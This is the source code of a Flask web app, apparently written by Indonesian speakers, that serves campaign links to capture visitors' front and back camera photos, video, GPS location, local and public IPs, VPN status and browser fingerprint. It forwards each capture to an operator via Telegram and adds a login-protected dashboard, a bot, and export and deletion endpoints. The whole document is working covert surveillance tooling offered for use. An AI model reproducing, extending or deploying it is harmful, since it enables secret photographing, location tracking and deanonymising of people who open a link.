F["app/routes/capture.py"] = "from flask import Blueprint, render_template, request, jsonify\nfrom datetime import datetime\nimport json\nfrom app.config import Config\nfrom app.database import db\nfrom app.models import Session, Event\nfrom app.services.storage import save_bytes, save_video, decode_data_url\nfrom app.services.telegram import send_photo, send_text, send_video\nfrom app.services.geo import reverse_geocode, check_vpn\nfrom app.tasks import rate_limit_check, enqueue_telegram\n\nbp = Blueprint('capture', __name__)\n\n@bp.route('/')\ndef index():\n    return render_template('capture.html', campaign='default')\n\n@bp.route('/c/<campaign>')\ndef index_campaign(campaign):\n    return render_template('capture.html', campaign=campaign)\n\n@bp.route('/upload', methods=['POST'])\ndef upload():\n    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)\n    client_ip = client_ip.split(',')[0].strip()\n    if not rate_limit_check('rl:upload:' + client_ip, Config.RATE_LIMIT_UPLOAD_PER_HOUR, 3600):\n        return jsonify({'ok': False, 'msg': 'rate limit exceeded'}), 429\n    payload = request.get_json(force=True, silent=True) or {}\n    now = datetime.now()\n    ts = now.strftime('%Y%m%d_%H%M%S') + '_' + str(now.microsecond // 1000).zfill(3)\n    campaign = payload.get('campaign') or 'default'\n    img_depan = decode_data_url(payload.get('image_depan', ''))\n    img_belakang = decode_data_url(payload.get('image_belakang', ''))\n    vid_bytes = decode_data_url(payload.get('video_belakang', '')) if payload.get('video_belakang') else b''\n    extra_shots = payload.get('extra_shots', [])\n    has_depan = bool(img_depan)\n    has_belakang = bool(img_belakang)\n    has_video = bool(vid_bytes)\n    if has_depan: save_bytes(ts, 'depan', img_depan)\n    if has_belakang: save_bytes(ts, 'belakang', img_belakang)\n    if has_video: save_video(ts, vid_bytes)\n    for i, shot in enumerate(extra_shots[:4]):\n        b = decode_data_url(shot)\n        if b: save_bytes(ts, 'shot' + str(i + 1), b)\n    ip_info = payload.get('ip_info') or {}\n    gps = payload.get('lokasi_gps') or {}\n    fingerprint = payload.get('fingerprint') or {}\n    local_ips = payload.get('local_ips') or []\n    lat = gps.get('lat') if gps else None\n    lon = gps.get('lon') if gps else None\n    alamat = reverse_geocode(lat, lon) if (lat and lon) else ''\n    is_vpn = check_vpn(payload.get('ip_publik'))\n    s = Session(ts=ts, waktu=ts, campaign=campaign, ip_koneksi=client_ip, ip_publik=payload.get('ip_publik'), ip_lokal=','.join(local_ips[:5]), country=ip_info.get('country_name') or ip_info.get('country'), city=ip_info.get('city'), region=ip_info.get('region'), isp=ip_info.get('org') or ip_info.get('asn'), is_vpn=int(is_vpn), lat=lat, lon=lon, akurasi_m=gps.get('akurasi_m') if gps else None, alamat=alamat, user_agent=request.headers.get('User-Agent'), fingerprint=json.dumps(fingerprint, ensure_ascii=False), has_depan=int(has_depan), has_belakang=int(has_belakang), has_video=int(has_video))\n    descs = []\n    if has_depan:\n        c = 'FOTO DEPAN ' + ts + ' IP: ' + (s.ip_publik or '-') + ' Kota: ' + (s.city or '-') + ',' + (s.region or '-')\n        enqueue_telegram(send_photo, img_depan, c)\n        descs.append('depan:queued')\n    if has_belakang:\n        c = 'FOTO BELAKANG ' + ts + ' IP: ' + (s.ip_publik or '-')\n        enqueue_telegram(send_photo, img_belakang, c)\n        descs.append('belakang:queued')\n    if has_video:\n        c = 'VIDEO ' + ts\n        enqueue_telegram(send_video, vid_bytes, c)\n        descs.append('video:queued')\n    if not (has_depan or has_belakang or has_video):\n        txt = 'Link dibuka\\nWaktu: ' + ts + '\\nIP: ' + (s.ip_publik or s.ip_koneksi) + '\\nKota: ' + (s.city or '-') + ',' + (s.region or '-') + '\\nISP: ' + (s.isp or '-') + '\\nVPN: ' + ('YA' if is_vpn else 'tidak') + '\\nCampaign: ' + campaign\n        enqueue_telegram(send_text, txt)\n        descs.append('text:queued')\n    detail = 'Detail ' + ts + '\\nIP lokal: ' + (s.ip_lokal or '-') + '\\nGPS: ' + str(lat) + ',' + str(lon) + '\\nAlamat: ' + (alamat or '-') + '\\nISP: ' + (s.isp or '-') + '\\nVPN: ' + ('YA' if is_vpn else 'tidak')\n    enqueue_telegram(send_text, detail)\n    s.telegram_ok = 1\n    s.telegram_desc = ', '.join(descs)\n    db.session.add(s)\n    db.session.commit()\n    try:\n        from app import socketio\n        if socketio:\n            socketio.emit('new_session', s.to_dict(), namespace='/dash')\n    except Exception as e:\n        print('[ws emit]', e)\n    return jsonify({'ok': True, 'msg': 'Tersimpan', 'ts': ts})\n\n@bp.route('/ping', methods=['POST'])\ndef ping():\n    payload = request.get_json(silent=True) or {}\n    ts = payload.get('ts')\n    if not ts:\n        return jsonify({'ok': False}), 400\n    e = Event(session_ts=ts, event_type=payload.get('event_type', 'ping'), data=json.dumps(payload.get('data') or {}))\n    db.session.add(e)\n    db.session.commit()\n    return jsonify({'ok': True})\n"

F["app/routes/dashboard.py"] = "from flask import Blueprint, render_template, request, redirect, url_for, make_response, jsonify\nfrom app.auth import create_token, login_required\nfrom app.config import Config\nfrom app.database import db\nfrom app.models import Session as SessionModel, Event\nfrom app.services.analytics import summary\nimport json\n\nbp = Blueprint('dashboard', __name__)\n\n@bp.route('/login', methods=['GET', 'POST'])\ndef login_page():\n    if request.method == 'POST':\n        u = request.form.get('user')\n        p = request.form.get('pass')\n        if u == Config.DASH_USER and p == Config.DASH_PASS:\n            token = create_token(u)\n            resp = make_response(redirect(url_for('dashboard.index')))\n            resp.set_cookie('session_token', token, httponly=True, samesite='Lax', max_age=86400 * 7, secure=False)\n            return resp\n        return render_template('login.html', error='Username/password salah')\n    return render_template('login.html')\n\n@bp.route('/logout')\ndef logout():\n    resp = make_response(redirect(url_for('dashboard.login_page')))\n    resp.delete_cookie('session_token')\n    return resp\n\n@bp.route('/dashboard')\n@login_required\ndef index():\n    rows = SessionModel.query.order_by(SessionModel.id.desc()).limit(200).all()\n    sessions = [r.to_dict() for r in rows]\n    stats = summary()\n    return render_template('dashboard.html', sessions=sessions, stats=stats, stats_json=json.dumps(stats))\n\n@bp.route('/api/sessions')\n@login_required\ndef api_sessions():\n    q = request.args.get('q', '').strip()\n    campaign = request.args.get('campaign', '').strip()\n    query = SessionModel.query\n    if q:\n        like = '%' + q + '%'\n        query = query.filter(db.or_(SessionModel.ip_publik.ilike(like), SessionModel.city.ilike(like), SessionModel.region.ilike(like), SessionModel.ip_koneksi.ilike(like)))\n    if campaign:\n        query = query.filter(SessionModel.campaign == campaign)\n    rows = query.order_by(SessionModel.id.desc()).limit(500).all()\n    return jsonify([r.to_dict() for r in rows])\n\n@bp.route('/api/session/<ts>/events')\n@login_required\ndef api_events(ts):\n    rows = Event.query.filter_by(session_ts=ts).order_by(Event.id.desc()).limit(100).all()\n    return jsonify([{'id': r.id, 'event_type': r.event_type, 'data': r.data, 'created_at': r.created_at.isoformat()} for r in rows])\n"

F["app/routes/api.py"] = "from flask import Blueprint, request, jsonify, send_file, send_from_directory\nfrom app.auth import login_required\nfrom app.config import Config\nfrom app.database import db\nfrom app.models import Session as SessionModel, Event\nfrom app.services.storage import delete_session_files\nfrom app.services.analytics import summary\nimport os, io, zipfile, csv\n\nbp = Blueprint('api', __name__)\n\n@bp.route('/stats')\n@login_required\ndef stats():\n    return jsonify(summary())\n\n@bp.route('/campaigns')\n@login_required\ndef campaigns():\n    rows = db.session.query(SessionModel.campaign, db.func.count(SessionModel.id)).group_by(SessionModel.campaign).order_by(db.func.count(SessionModel.id).desc()).all()\n    return jsonify([{'campaign': r[0], 'n': r[1]} for r in rows])\n\n@bp.route('/delete/<ts>', methods=['POST', 'DELETE'])\n@login_required\ndef delete_session(ts):\n    delete_session_files(ts)\n    SessionModel.query.filter_by(ts=ts).delete()\n    Event.query.filter_by(session_ts=ts).delete()\n    db.session.commit()\n    return jsonify({'ok': True})\n\n@bp.route('/export/zip')\n@login_required\ndef export_zip():\n    mem = io.BytesIO()\n    with zipfile.ZipFile(mem, 'w', zipfile.ZIP_DEFLATED) as z:\n        for f in os.listdir(Config.UPLOAD_DIR):\n            fp = os.path.join(Config.UPLOAD_DIR, f)\n            if os.path.isfile(fp):\n                z.write(fp, arcname=f)\n        rows = SessionModel.query.all()\n        import json as _json\n        z.writestr('sessions.json', _json.dumps([r.to_dict() for r in rows], indent=2, default=str))\n    mem.seek(0)\n    return send_file(mem, mimetype='application/zip', as_attachment=True, download_name='export_sessions.zip')\n\n@bp.route('/export/csv')\n@login_required\ndef export_csv():\n    rows = SessionModel.query.all()\n    buf = io.StringIO()\n    if rows:\n        data = [r.to_dict() for r in rows]\n        w = csv.DictWriter(buf, fieldnames=data[0].keys())\n        w.writeheader()\n        for d in data:\n            d.pop('fingerprint_obj', None)\n            w.writerow(d)\n    mem = io.BytesIO(buf.getvalue().encode('utf-8'))\n    return send_file(mem, mimetype='text/csv', as_attachment=True, download_name='sessions.csv')\n\n@bp.route('/file/<path:fname>')\n@login_required\ndef get_file(fname):\n    return send_from_directory(Config.UPLOAD_DIR, fname)\n"

F["app/routes/telegram_bot.py"] = "from flask import Blueprint, request, jsonify\nfrom app.config import Config\nfrom app.database import db\nfrom app.models import Session as SessionModel, Event\nfrom app.services.telegram import send_text, send_photo, send_video\nfrom app.services.storage import delete_session_files\nimport os\n\nbp = Blueprint('tg_bot', __name__)\n\n@bp.route('/webhook', methods=['POST'])\ndef webhook():\n    if Config.TG_WEBHOOK_SECRET:\n        if request.headers.get('X-Telegram-Bot-Api-Secret-Token') != Config.TG_WEBHOOK_SECRET:\n            return jsonify({'ok': False}), 403\n    update = request.get_json(silent=True) or {}\n    msg = update.get('message') or update.get('edited_message') or {}\n    text = (msg.get('text') or '').strip()\n    if text in ('/start', '/help'):\n        send_text('Perintah: /list /get /del /stats')\n        return jsonify({'ok': True})\n    if text == '/stats':\n        from app.services.analytics import summary\n        s = summary()\n        send_text('Statistik\\nTotal: ' + str(s['total']) + '\\nAda foto: ' + str(s['with_photo']) + '\\nHari ini: ' + str(s['today']))\n        return jsonify({'ok': True})\n    if text == '/list':\n        rows = SessionModel.query.order_by(SessionModel.id.desc()).limit(10).all()\n        if not rows:\n            send_text('Belum ada sesi.')\n        else:\n            lines = ['Sesi terbaru:']\n            for r in rows:\n                lines.append('- ' + r.ts + ' - ' + (r.city or '?') + ', ' + (r.region or '?') + ' (' + (r.ip_publik or '-') + ')')\n            send_text('\\n'.join(lines))\n        return jsonify({'ok': True})\n    if text.startswith('/get '):\n        ts = text.split(' ', 1)[1].strip()\n        r = SessionModel.query.filter_by(ts=ts).first()\n        if not r:\n            send_text('Sesi tidak ditemukan.')\n            return jsonify({'ok': True})\n        info = 'Sesi ' + ts + '\\nIP: ' + (r.ip_publik or r.ip_koneksi or '-') + '\\nKota: ' + (r.city or '-') + ',' + (r.region or '-') + '\\nISP: ' + (r.isp or '-') + '\\nGPS: ' + str(r.lat) + ',' + str(r.lon)\n        send_text(info)\n        for suffix in ('depan', 'belakang'):\n            fp = os.path.join(Config.UPLOAD_DIR, ts + '_' + suffix + '.png')\n            if os.path.isfile(fp):\n                with open(fp, 'rb') as f:\n                    send_photo(f.read(), suffix + ' - ' + ts)\n        vp = os.path.join(Config.UPLOAD_DIR, ts + '_video.webm')\n        if os.path.isfile(vp):\n            with open(vp, 'rb') as f:\n                send_video(f.read(), 'video - ' + ts)\n        return jsonify({'ok': True})\n    if text.startswith('/del '):\n        ts = text.split(' ', 1)[1].strip()\n        delete_session_files(ts)\n        SessionModel.query.filter_by(ts=ts).delete()\n        Event.query.filter_by(session_ts=ts).delete()\n        db.session.commit()\n        send_text('Sesi ' + ts + ' dihapus.')\n        return jsonify({'ok': True})\n    return jsonify({'ok': True})\n"

